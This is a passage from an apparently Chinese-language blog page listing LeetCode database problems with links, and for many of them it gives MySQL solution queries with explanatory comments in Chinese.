href="https://leetcode-cn.com/problems/rising-temperature" target="_blank" rel="noopener">197. 上升的温度</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">select w1.Id</span><br><span class="line">from Weather w1, Weather w2</span><br><span class="line">where date_sub(w1.RecordDate, interval 1 day) &#x3D; w2.RecordDate</span><br><span class="line">        and w1.Temperature &gt; w2.Temperature</span><br><span class="line">        </span><br><span class="line"># or</span><br><span class="line">select w1.Id</span><br><span class="line">from Weather w1, Weather w2</span><br><span class="line">where datediff(w1.RecordDate, w2.RecordDate) &#x3D; 1</span><br><span class="line">        and w1.Temperature &gt; w2.Temperature</span><br><span class="line">      </span><br><span class="line"># or</span><br><span class="line">select w1.Id</span><br><span class="line">from Weather w1, Weather w2</span><br><span class="line">where date_add(w2.RecordDate, interval 1 day) &#x3D; w1.RecordDate</span><br><span class="line">        and w1.Temperature &gt; w2.Temperature</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/trips-and-users" target="_blank" rel="noopener">262. 行程和用户</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">select Request_at &#39;Day&#39;,</span><br><span class="line">        round(avg(Status !&#x3D; &#39;completed&#39;), 2) &#39;Cancellation Rate&#39; # 必须加引号，有空格</span><br><span class="line">from Trips t left join Users u</span><br><span class="line">on t.Client_Id &#x3D; u.Users_id</span><br><span class="line">where Banned &#x3D; &#39;No&#39;</span><br><span class="line">        and Request_at between &#39;2013-10-01&#39; and &#39;2013-10-03&#39;</span><br><span class="line">group by Request_at  # 或者 group by Day， 不能写为 &#39;Day&#39;</span><br><span class="line"></span><br><span class="line"># or</span><br><span class="line">select Request_at &#39;Day&#39;,</span><br><span class="line">        round(sum(Status !&#x3D; &#39;completed&#39;)&#x2F;count(*), 2) &#39;Cancellation Rate&#39; # 必须加引号，有空格</span><br><span class="line">from Trips t left join Users u</span><br><span class="line">on t.Client_Id &#x3D; u.Users_id</span><br><span class="line">where Banned &#x3D; &#39;No&#39;</span><br><span class="line">        and Request_at between &#39;2013-10-01&#39; and &#39;2013-10-03&#39;</span><br><span class="line">group by Request_at  # 或者 group by Day， 不能写为 &#39;Day&#39;</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/game-play-analysis-i" target="_blank" rel="noopener">511. 游戏玩法分析 I</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select player_id, min(event_date) first_login from Activity</span><br><span class="line">group by player_id</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/game-play-analysis-ii" target="_blank" rel="noopener">512. 游戏玩法分析 II</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 请编写一个 SQL 查询，描述每一个玩家首次登陆的设备名称</span><br><span class="line">select a.player_id, a.device_id</span><br><span class="line">from Activity a,</span><br><span class="line">    (   select *, min(event_date) mindate</span><br><span class="line">        from Activity</span><br><span class="line">        group by player_id</span><br><span class="line">    ) t</span><br><span class="line">where a.player_id &#x3D; t.player_id and a.event_date &#x3D; t.mindate</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/game-play-analysis-iii" target="_blank" rel="noopener">534. 游戏玩法分析 III</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 编写一个 SQL 查询，同时报告每组玩家和日期，以及玩家到目前为止玩了多少游戏。也就是说，在此日期之前玩家所玩的游戏总数。详细情况请查看示例。</span><br><span class="line">select a1.player_id, a1.event_date, </span><br><span class="line">    sum(a2.games_played) games_played_so_far</span><br><span class="line">from Activity a1, Activity a2</span><br><span class="line">where a1.player_id &#x3D; a2.player_id</span><br><span class="line">    and a1.event_date &gt;&#x3D; a2.event_date</span><br><span class="line">group by a1.player_id, a1.event_date</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/game-play-analysis-iv" target="_blank" rel="noopener">550. 游戏玩法分析 IV</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 您需要计算从首次登录日期开始至少连续两天登录的玩家的数量，然后除以玩家总数。</span><br><span class="line">select round(count(*)&#x2F;(select count(distinct player_id) from Activity), 2) fraction</span><br><span class="line">from Activity a</span><br><span class="line">where (player_id, event_date) in</span><br><span class="line">(</span><br><span class="line">    select player_id, date_add(min(event_date), interval 1 day) first_day</span><br><span class="line">    from Activity</span><br><span class="line">    group by player_id</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/median-employee-salary" target="_blank" rel="noopener">569. 员工薪水中位数</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 请编写SQL查询来查找每个公司的薪水中位数。</span><br><span class="line"># 挑战点：你是否可以在不使用任何内置的SQL函数的情况下解决此问题。</span><br><span class="line">select Id, Company, Salary</span><br><span class="line">from</span><br><span class="line">(</span><br><span class="line">    select *, </span><br><span class="line">            row_number() over (partition by Company order by Salary) rnk,</span><br><span class="line">            count(*) over (partition by Company) num</span><br><span class="line">    from Employee</span><br><span class="line">) t</span><br><span class="line">where(</span><br><span class="line">        (num%2&#x3D;1 and rnk &#x3D; floor(num&#x2F;2)+1)</span><br><span class="line">        or</span><br><span class="line">        (num%2&#x3D;0 and (rnk &#x3D; floor(num&#x2F;2) or rnk &#x3D; floor(num&#x2F;2)+1))</span><br><span class="line">     )</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/managers-with-at-least-5-direct-reports" target="_blank" rel="noopener">570. 至少有5名直接下属的经理</a></p><p><a href="https://leetcode-cn.com/problems/find-median-given-frequency-of-numbers" target="_blank" rel="noopener">571. 给定数字的频率查询中位数</a></p><p><a href="https://leetcode-cn.com/problems/winning-candidate" target="_blank" rel="noopener">574. 当选者</a></p><p><a href="https://leetcode-cn.com/problems/employee-bonus" target="_blank" rel="noopener">577. 员工奖金</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select e.name, b.bonus </span><br><span class="line">from Employee e left join Bonus b</span><br><span class="line">using (empId)</span><br><span class="line">where b.bonus &lt; 1000 or b.bonus is null</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/get-highest-answer-rate-question" target="_blank" rel="noopener">578. 查询回答率最高的问题</a></p><p><a href="https://leetcode-cn.com/problems/find-cumulative-salary-of-an-employee" target="_blank" rel="noopener">579. 查询员工的累计薪水</a></p><p><a href="https://leetcode-cn.com/problems/count-student-number-in-departments" target="_blank" rel="noopener">580. 统计各专业学生人数</a></p><p><a href="https://leetcode-cn.com/problems/find-customer-referee" target="_blank" rel="noopener">584. 寻找用户推荐人</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">select name from customer</span><br><span class="line">where referee_id not in (2) or referee_id is null</span><br><span class="line"># or</span><br><span class="line">select name from customer</span><br><span class="line">where referee_id !&#x3D; 2 or referee_id is null</span><br><span class="line"># or</span><br><span class="line">select name from customer</span><br><span class="line">where referee_id &lt;&gt; 2 or referee_id is null</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/investments-in-2016" target="_blank" rel="noopener">585. 2016年的投资</a></p><p><a href="https://leetcode-cn.com/problems/customer-placing-the-largest-number-of-orders" target="_blank" rel="noopener">586. 订单最多的客户</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select t.customer_number customer_number from</span><br><span class="line">(</span><br><span class="line">    select customer_number, count(customer_number) amount from orders</span><br><span class="line">    group by customer_number</span><br><span class="line">    order by amount desc</span><br><span class="line">    limit 1 offset 0</span><br><span class="line">) t</span><br><span class="line"># or</span><br><span class="line">select customer_number from orders</span><br><span class="line">group by customer_number</span><br><span class="line">order by count(customer_number) desc</span><br><span class="line">limit 1</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/big-countries" target="_blank" rel="noopener">595. 大的国家</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">SELECT name, population, area </span><br><span class="line">FROM World </span><br><span class="line">WHERE population &gt; 25000000 </span><br><span class="line">OR area &gt; 3000000;</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/classes-more-than-5-students" target="_blank" rel="noopener">596. 超过5名学生的课</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有超过或等于5名学生的课</span><br><span class="line">SELECT class FROM courses GROUP BY class</span><br><span class="line">HAVING COUNT(DISTINCT student) &gt;&#x3D; 5;</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/friend-requests-i-overall-acceptance-rate" target="_blank" rel="noopener">597. 好友申请 I：总体通过率</a></p><p><a href="https://leetcode-cn.com/problems/human-traffic-of-stadium" target="_blank" rel="noopener">601. 体育馆的人流量</a></p><p><a href="https://leetcode-cn.com/problems/friend-requests-ii-who-has-the-most-friends" target="_blank" rel="noopener">602. 好友申请 II ：谁有最多的好友</a></p><p><a href="https://leetcode-cn.com/problems/consecutive-available-seats" target="_blank" rel="noopener">603. 连续空余座位</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select distinct a.seat_id</span><br><span class="line">    from cinema a join cinema b</span><br><span class="line">    on abs(a.seat_id-b.seat_id) &#x3D; 1 and a.free &#x3D; true and b.free &#x3D; true</span><br><span class="line">order by a.seat_id</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/sales-person" target="_blank" rel="noopener">607. 销售员</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 输出所有表 salesperson 中，没有向公司 ‘RED’ 销售任何东西的销售员</span><br><span class="line">select name from salesperson</span><br><span class="line">where sales_id not in</span><br><span class="line">(</span><br><span class="line">    select sales_id from</span><br><span class="line">    orders left join company</span><br><span class="line">    using(com_id)</span><br><span class="line">    where company.name &#x3D; &#39;RED&#39;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/tree-node" target="_blank" rel="noopener">608. 树节点</a></p><p><a href="https://leetcode-cn.com/problems/triangle-judgement" target="_blank" rel="noopener">610. 判断三角形</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select x, y, z, </span><br><span class="line">    case when x+y &gt; z and x+z &gt; y and y+z &gt; x then &#39;Yes&#39;</span><br><span class="line">        else &#39;No&#39;</span><br><span class="line">    end as triangle</span><br><span class="line">from triangle</span><br><span class="line"># or</span><br><span class="line">select *, if(x+y&gt;z and x+z&gt;y and y+z&gt;x, &#39;Yes&#39;, &#39;No&#39;) as triangle</span><br><span class="line">from triangle</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/shortest-distance-in-a-plane" target="_blank" rel="noopener">612. 平面上的最近距离</a></p><p><a href="https://leetcode-cn.com/problems/shortest-distance-in-a-line" target="_blank" rel="noopener">613. 直线上的最近距离</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select min(abs(p1.x - p2.x)) shortest </span><br><span class="line">from point p1 left join point p2</span><br><span class="line">on p1.x !&#x3D; p2.x</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/second-degree-follower" target="_blank" rel="noopener">614. 二级关注者</a></p><p><a href="https://leetcode-cn.com/problems/average-salary-departments-vs-company" target="_blank" rel="noopener">615. 平均工资：部门与公司比较</a></p><p><a href="https://leetcode-cn.com/problems/students-report-by-geography" target="_blank" rel="noopener">618. 学生地理信息报告</a></p><p><a href="https://leetcode-cn.com/problems/biggest-single-number" target="_blank" rel="noopener">619. 只出现一次的最大数字</a></p><p><a href="https://leetcode-cn.com/problems/not-boring-movies" target="_blank" rel="noopener">620. 有趣的电影</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM cinema </span><br><span class="line">WHERE description !&#x3D; &#39;boring&#39; </span><br><span class="line">        AND id%2 &#x3D; 1 </span><br><span class="line">ORDER BY rating DESC</span><br><span class="line"></span><br><span class="line"># 或者用 mod(id,2) &#x3D; 1</span><br><span class="line"># !&#x3D;也可以用&lt;&gt;</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/exchange-seats" target="_blank" rel="noopener">626. 换座位</a></p><p><a href="https://leetcode-cn.com/problems/swap-salary" target="_blank" rel="noopener">627. 变更性别</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">UPDATE salary SET sex&#x3D;</span><br><span class="line">    CASE sex </span><br><span class="line">        WHEN &#39;m&#39; THEN &#39;f&#39;</span><br><span class="line">        ELSE &#39;m&#39;</span><br><span class="line">    END;</span><br><span class="line">    </span><br><span class="line"># or</span><br><span class="line">update salary set sex &#x3D; IF(sex &#x3D; &#39;m&#39;, &#39;f&#39;, &#39;m&#39;)</span><br><span class="line"></span><br><span class="line"># or </span><br><span class="line">update salary set sex &#x3D; char(ASCII(sex)^ASCII(&#39;m&#39;)^ASCII(&#39;f&#39;))</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/customers-who-bought-all-products" target="_blank" rel="noopener">1045. 买下所有产品的客户</a></p><p><a href="https://leetcode-cn.com/problems/actors-and-directors-who-cooperated-at-least-three-times" target="_blank" rel="noopener">1050. 合作过至少三次的演员和导演</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select actor_id, director_id from ActorDirector</span><br><span class="line">group by actor_id, director_id</span><br><span class="line">having count(*) &gt;&#x3D; 3</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/product-sales-analysis-i" target="_blank" rel="noopener">1068. 产品销售分析 I</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 写一条SQL 查询语句获取产品表 Product 中所有的 产品名称 product name 以及 该产品在 Sales 表中相对应的 上市年份 year 和 价格 price。</span><br><span class="line">select b.product_name, a.year, a.price</span><br><span class="line">from Sales a</span><br><span class="line">join Product b</span><br><span class="line">on a.product_id &#x3D; b.product_id</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/product-sales-analysis-ii" target="_blank" rel="noopener">1069. 产品销售分析 II</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select s.product_id, sum(s.quantity) total_quantity from</span><br><span class="line">    Sales s left join Product p</span><br><span class="line">    using(product_id)</span><br><span class="line">    group by s.product_id</span><br><span class="line">#   order by s.product_id # 可选排序</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/product-sales-analysis-iii" target="_blank" rel="noopener">1070. 产品销售分析 III</a></p><p><a href="https://leetcode-cn.com/problems/project-employees-i" target="_blank" rel="noopener">1075. 项目员工 I</a></p><p><a href="https://leetcode-cn.com/problems/project-employees-ii" target="_blank" rel="noopener">1076. 项目员工II</a></p><p><a href="https://leetcode-cn.com/problems/project-employees-iii" target="_blank" rel="noopener">1077. 项目员工 III</a></p><p><a href="https://leetcode-cn.com/problems/sales-analysis-i" target="_blank" rel="noopener">1082. 销售分析 I</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 这样写是因为总销售额最高的销售者有可能不止一位</span><br><span class="line">select seller_id from Sales</span><br><span class="line">group by seller_id</span><br><span class="line">having sum(price) &#x3D; </span><br><span class="line">        (</span><br><span class="line">            select sum(price) as totalincome from Sales</span><br><span class="line">            group by seller_id</span><br><span class="line">            order by totalincome desc</span><br><span class="line">            limit 1</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line"># or ——all 函数，所有的都要满足</span><br><span class="line">select seller_id from Sales</span><br><span class="line">group by seller_id</span><br><span class="line">having sum(price) &gt;&#x3D;</span><br><span class="line">        all(</span><br><span class="line">            select sum(price) from Sales</span><br><span class="line">            group by seller_id</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/sales-analysis-ii" target="_blank" rel="noopener">1083. 销售分析 II</a></p><p><a href="https://leetcode-cn.com/problems/sales-analysis-iii" target="_blank" rel="noopener">1084. 销售分析III</a></p><p><a href="https://leetcode-cn.com/problems/game-play-analysis-v" target="_blank" rel="noopener">1097. 游戏玩法分析 V</a></p><p><a href="https://leetcode-cn.com/problems/unpopular-books" target="_blank" rel="noopener">1098. 小众书籍</a></p><p><a href="https://leetcode-cn.com/problems/new-users-daily-count" target="_blank" rel="noopener">1107. 每日新用户统计</a></p><p><a href="https://leetcode-cn.com/problems/highest-grade-for-each-student" target="_blank" rel="noopener">1112. 每位学生的最高成绩</a></p><p><a href="https://leetcode-cn.com/problems/reported-posts" target="_blank" rel="noopener">1113. 报告的记录</a></p><p><a href="https://leetcode-cn.com/problems/active-businesses" target="_blank" rel="noopener">1126. 查询活跃业务</a></p><p><a href="https://leetcode-cn.com/problems/user-purchase-platform" target="_blank" rel="noopener">1127. 用户购买平台</a></p><p><a href="https://leetcode-cn.com/problems/reported-posts-ii" target="_blank" rel="noopener">1132. 报告的记录 II</a></p><p><a href="https://leetcode-cn.com/problems/user-activity-for-the-past-30-days-i" target="_blank" rel="noopener">1141. 查询近30天活跃用户数</a></p><p><a href="https://leetcode-cn.com/problems/user-activity-for-the-past-30-days-ii" target="_blank" rel="noopener">1142. 过去30天的用户活动 II</a></p><p><a href="https://leetcode-cn.com/problems/article-views-i" target="_blank" rel="noopener">1148. 文章浏览 I</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select distinct author_id as id from Views</span><br><span class="line">where viewer_id &#x3D; author_id</span><br><span class="line">order by id</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/article-views-ii" target="_blank" rel="noopener">1149. 文章浏览 II</a></p><p><a href="https://leetcode-cn.com/problems/market-analysis-i" target="_blank" rel="noopener">1158. 市场分析 I</a></p><p><a href="https://leetcode-cn.com/problems/market-analysis-ii" target="_blank" rel="noopener">1159. 市场分析 II</a></p><p><a href="https://leetcode-cn.com/problems/product-price-at-a-given-date" target="_blank" rel="noopener">1164. 指定日期的产品价格</a></p><p><a href="https://leetcode-cn.com/problems/immediate-food-delivery-i" target="_blank" rel="noopener">1173. 即时食物配送 I</a></p><p><a href="https://leetcode-cn.com/problems/immediate-food-delivery-ii" target="_blank" rel="noopener">1174. 即时食物配送 II</a></p><p><a href="https://leetcode-cn.com/problems/reformat-department-table" target="_blank" rel="noopener">1179. 重新格式化部门表</a></p><p><a href="https://leetcode-cn.com/problems/monthly-transactions-i" target="_blank" rel="noopener">1193. 每月交易 I</a></p><p><a href="https://leetcode-cn.com/problems/tournament-winners" target="_blank" rel="noopener">1194. 锦标赛优胜者</a></p><p><a href="https://leetcode-cn.com/problems/last-person-to-fit-in-the-bus" target="_blank" rel="noopener">1204. 最后一个能进入电梯的人</a></p><p><a href="https://leetcode-cn.com/problems/monthly-transactions-ii" target="_blank" rel="noopener">1205. 每月交易II</a></p><p><a href="https://leetcode-cn.com/problems/queries-quality-and-percentage" target="_blank" rel="noopener">1211. 查询结果的质量和占比</a></p><p><a href="https://leetcode-cn.com/problems/team-scores-in-football-tournament" target="_blank" rel="noopener">1212. 查询球队积分</a></p><p><a href="https://leetcode-cn.com/problems/report-contiguous-dates" target="_blank" rel="noopener">1225. 报告系统状态的连续日期</a></p><p><a href="https://leetcode-cn.com/problems/number-of-comments-per-post" target="_blank" rel="noopener">1241. 每个帖子的评论数</a></p><p><a href="https://leetcode-cn.com/problems/average-selling-price" target="_blank" rel="noopener">1251. 平均售价</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select p.product_id, round(sum(p.price*s.units)&#x2F;sum(s.units), 2) average_price</span><br><span class="line">from Prices p left join UnitsSold s</span><br><span class="line">on p.product_id &#x3D; s.product_id </span><br><span class="line">    and s.purchase_date &gt;&#x3D; p.start_date</span><br><span class="line">    and s.purchase_date &lt;&#x3D; p.end_date</span><br><span class="line">group by p.product_id</span><br><span class="line"></span><br><span class="line"># Result table:</span><br><span class="line">+------------+---------------+</span><br><span class="line">| product_id | average_price |</span><br><span class="line">+------------+---------------+</span><br><span class="line">| 1          | 6.96          |</span><br><span class="line">| 2          | 16.96         |</span><br><span class="line">+------------+---------------+</span><br><span class="line">平均售价 &#x3D; 产品总价 &#x2F; 销售的产品数量。</span><br><span class="line">产品 1 的平均售价 &#x3D; ((100 * 5)+(15 * 20) )&#x2F; 115 &#x3D; 6.96</span><br><span class="line">产品 2 的平均售价 &#x3D; ((200 * 15)+(30 * 30) )&#x2F; 230 &#x3D; 16.96</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/page-recommendations" target="_blank" rel="noopener">1264. 页面推荐</a></p><p><a href="https://leetcode-cn.com/problems/all-people-report-to-the-given-manager" target="_blank" rel="noopener">1270. 向公司CEO汇报工作的所有人</a></p><p><a href="https://leetcode-cn.com/problems/students-and-examinations" target="_blank" rel="noopener">1280. 学生们参加各科测试的次数</a></p><p><a href="https://leetcode-cn.com/problems/find-the-start-and-end-number-of-continuous-ranges" target="_blank" rel="noopener">1285. 找到连续区间的开始和结束数字</a></p><p><a href="https://leetcode-cn.com/problems/weather-type-in-each-country" target="_blank" rel="noopener">1294. 不同国家的天气类型</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select country_name, </span><br><span class="line">        case when avg(weather_state)&lt;&#x3D; 15 then &#39;Cold&#39;</span><br><span class="line">             when avg(weather_state)&gt;&#x3D; 25 then &#39;Hot&#39;</span><br><span class="line">             else &#39;Warm&#39; end as weather_type</span><br><span class="line">from Countries left join Weather</span><br><span class="line">using (country_id)</span><br><span class="line"># where day between &#39;2019-11-01&#39; and &#39;2019-11-30&#39;</span><br><span class="line">where day like &#39;2019-11%&#39; # 也可以</span><br><span class="line">group by country_id</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/find-the-team-size" target="_blank" rel="noopener">1303. 求团队人数</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 自连接，按着 team_id，有重复的 team_id，产生了笛卡尔积</span><br><span class="line">select a.employee_id, count(*) team_size from </span><br><span class="line">Employee a left join Employee b</span><br><span class="line">on a.team_id &#x3D; b.team_id # 产生了笛卡尔积</span><br><span class="line">group by a.employee_id</span><br><span class="line"></span><br><span class="line"># or </span><br><span class="line">select a.employee_id, temp.team_size from </span><br><span class="line">Employee a left join</span><br><span class="line">(</span><br><span class="line">    select team_id, count(*) team_size from Employee</span><br><span class="line">    group by team_id</span><br><span class="line">) temp</span><br><span class="line"># on a.team_id &#x3D; temp.team_id 也可以用 using</span><br><span class="line">using(team_id)</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/running-total-for-different-genders" target="_blank" rel="noopener">1308. 不同性别每日分数总计</a></p><p><a href="https://leetcode-cn.com/problems/restaurant-growth" target="_blank" rel="noopener">1321. 餐馆营业额变化增长</a></p><p><a href="https://leetcode-cn.com/problems/ads-performance" target="_blank" rel="noopener">1322. 广告效果</a></p><p><a href="https://leetcode-cn.com/problems/list-the-products-ordered-in-a-period" target="_blank" rel="noopener">1327. 列出指定时间段内所有的下单产品</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select product_name, unit from</span><br><span class="line">(</span><br><span class="line">    select product_id, sum(unit) unit from Orders</span><br><span class="line">    where(order_date &gt;&#x3D; &#39;2020-02-01&#39; </span><br><span class="line">            and order_date &lt; &#39;2020-03-01&#39;)</span><br><span class="line">    group by product_id</span><br><span class="line">) t left join Products</span><br><span class="line">using(product_id)</span><br><span class="line">where unit &gt;&#x3D; 100</span><br></pre></td></tr></table></figure><p><a href="https://leetcode-cn.com/problems/number-of-transactions-per-visit" target="_blank" rel="noopener">1336. 每次访问的交易次数</a></p><p><a href="https://leetcode-cn.com/problems/movie-rating" target="_blank" rel="noopener">1341. 电影评分</a></p><p><a href="https://leetcode-cn.com/problems/students-with-invalid-departments" target="_blank" rel="noopener">1350. 院系无效的学生</a></p><figure class="highlight plain"><table><tr><td 